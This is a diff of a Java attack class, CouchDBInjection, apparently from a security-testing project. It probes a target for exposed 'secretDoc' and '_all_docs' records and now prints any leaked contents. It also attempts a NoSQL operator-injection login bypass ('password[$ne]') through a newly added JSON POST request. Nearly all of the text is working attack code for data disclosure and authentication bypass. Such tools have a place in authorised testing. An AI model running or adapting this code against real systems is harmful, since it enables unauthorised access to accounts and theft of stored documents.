@@ -13,13 +13,13 @@ public class CouchDBInjection {
     // IP address of the db to be attacked, including the port number (e.g. 127.0.0.1:8080)
     private String ipAddr;
     // Version number of the couch db to be attacked (different kind of attacks for different versions)
-    private String version;
+    // private String version;
 
     // Constructor
 
-    public CouchDBInjection(String ipAddr, String version){
+    public CouchDBInjection(String ipAddr){
         this.ipAddr = ipAddr;
-        this.version = version;
+        // this.version = version;
     }
 
     // Methods
@@ -46,8 +46,10 @@ public class CouchDBInjection {
         JSONObject resSecretDoc = sendGET(ipAddr + "/get?key[]=secretDoc");
         if(!resSecretDoc.isEmpty()){
             code = resSecretDoc.optInt("code", -1);
-            if(code == 200)
+            if(code == 200) {
                 System.out.println("\n------- SECRET DOC COMPROMISED! -------\n");
+                System.out.println(resSecretDoc);
+            }
             else
                 System.out.println("\n------- SECRET DOC PROTECTED! -------\n");
         }
@@ -58,6 +60,7 @@ public class CouchDBInjection {
             code = resAllDoc.optInt("code", -1);
             if(code == 200) {
                 System.out.println("\n------- _all_docs COMPROMISED! -------\n");
+                System.out.println(resAllDoc);
                 allDocsFlag = true;
             }
             else
@@ -76,11 +79,11 @@ public class CouchDBInjection {
                     code = resOneKey.optInt("code", -1);
                     if (code == 200)
                         user = resOneKey.optString("user", "");
-                    // TODO: trovare modo per controllare tutti nomi per "user"!!!
                 }
             }
             if(!user.equals("")){
-                JSONObject resUser = sendGET(ipAddr + "/login?user=" + user + "&password[%24ne]=");
+                String body = "{\"user\": \""+ user +"\", \"password[$ne]\": \"\"}";
+                JSONObject resUser = sendPOST(ipAddr + "/login", body);
                 code = resUser.optInt("code", -1);
                 boolean result = resUser.optBoolean("login", false);
                 if(code == 200 && result)
@@ -94,7 +97,7 @@ public class CouchDBInjection {
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
         int responseCode = con.getResponseCode();
-        System.out.println("GET Response Code :: " + responseCode);
+        // System.out.println("GET Response Code :: " + responseCode);
 
         BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
         String inputLine;
@@ -130,7 +133,43 @@ public class CouchDBInjection {
         }
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET Response Code :: " + responseCode);
+        //System.out.println("GET Response Code :: " + responseCode);
+
+        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+        String inputLine;
+        StringBuilder response = new StringBuilder();
+
+        while ((inputLine = in.readLine()) != null) {
+            response.append(inputLine);
+        }
+        in.close();
+
+        // print result
+        JSONObject myResponse = new JSONObject(response.toString());
+        myResponse.put("code", responseCode);
+        //System.out.println(myResponse.toString());
+
+        return myResponse;
+
+    }
+
+    private static JSONObject sendPOST(String url, String data) throws IOException {
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setDoOutput(true);
+        con.setRequestMethod("POST");
+        con.setRequestProperty("Content-Type", "application/json");
+        try {
+            OutputStreamWriter osw = new OutputStreamWriter(con.getOutputStream());
+            osw.write(data);
+            osw.flush();
+            osw.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        int responseCode = con.getResponseCode();
+        //System.out.println("GET Response Code :: " + responseCode);
 
         BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
         String inputLine;
@@ -156,15 +195,15 @@ public class CouchDBInjection {
         return ipAddr;
     }
 
-    public String getVersion() {
+    /*public String getVersion() {
         return version;
-    }
+    }*/
 
     public void setIpAddr(String ipAddr) {
         this.ipAddr = ipAddr;
     }
 
-    public void setVersion(String version) {
+    /*public void setVersion(String version) {
         this.version = version;
-    }
+    }*/
 }
